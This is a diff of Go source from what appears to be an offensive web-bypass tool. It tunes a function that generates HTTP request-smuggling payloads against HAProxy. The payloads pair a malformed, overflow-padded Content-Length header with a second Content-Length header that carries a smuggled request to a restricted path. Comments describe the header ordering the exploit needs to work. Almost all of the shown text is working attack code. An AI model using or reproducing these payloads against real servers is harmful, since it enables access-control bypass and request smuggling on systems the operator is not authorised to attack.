@@ -65,8 +65,8 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 			path, publicPath, host)
 
 		// Properly calculate the content length dynamically for the *second* Content-Length header:
-		//calculatedContentLengthForSecondHeader := len(smuggledRequest)
-		calculatedContentLengthForSecondHeader := 23
+		calculatedContentLengthForSecondHeader := len(smuggledRequest)
+		//calculatedContentLengthForSecondHeader := 23
 		//malformedHeaderName := "Content-Length" + overflowPattern + ":"
 		malformedHeaderName := "Content-Length" + overflowPattern //+ ":"
 		//malformedHeaderName := "Content-Length" + overflowPattern + ":"
@@ -74,6 +74,33 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 		// CRITICAL: The order of headers MUST be preserved exactly as specified here
 		// for this exploit to work. The malformed header MUST be first, followed by
 		// the regular Content-Length header.
+		// job := BypassPayload{
+		// 	OriginalURL:  targetURL,
+		// 	Method:       "POST",
+		// 	Scheme:       parsedURL.Scheme,
+		// 	Host:         host,
+		// 	RawURI:       publicPath,
+		// 	BypassModule: bypassModule,
+		// 	Body:         smuggledRequest,
+		// 	Headers: []Headers{
+		// 		// 1. Malformed header MUST be first - this will be processed first by HAProxy
+		// 		{
+		// 			Header: malformedHeaderName, // e.g., "Content-Length0...<255a's>:"
+		// 			Value:  "0",                 // Empty value, to be handled by BuildRawHTTPRequest
+		// 		},
+		// 		// 2. Regular Content-Length MUST be second - this will be processed by backend server
+		// 		{
+		// 			Header: "Content-Length",
+		// 			Value:  fmt.Sprintf("%d", calculatedContentLengthForSecondHeader),
+		// 		},
+		// 		// 3. Connection header
+		// 		{
+		// 			Header: "Connection",
+		// 			Value:  "close",
+		// 		},
+		// 	},
+		// }
+
 		job := BypassPayload{
 			OriginalURL:  targetURL,
 			Method:       "POST",
@@ -86,17 +113,12 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 				// 1. Malformed header MUST be first - this will be processed first by HAProxy
 				{
 					Header: malformedHeaderName, // e.g., "Content-Length0...<255a's>:"
-					Value:  "",                  // Empty value, to be handled by BuildRawHTTPRequest
+					Value:  "0",                 // Empty value, to be handled by BuildRawHTTPRequest
 				},
 				// 2. Regular Content-Length MUST be second - this will be processed by backend server
 				{
 					Header: "Content-Length",
 					Value:  fmt.Sprintf("%d", calculatedContentLengthForSecondHeader),
-				},
-				// 3. Connection header
-				{
-					Header: "Connection",
-					Value:  "close",
 				},
 			},
 		}
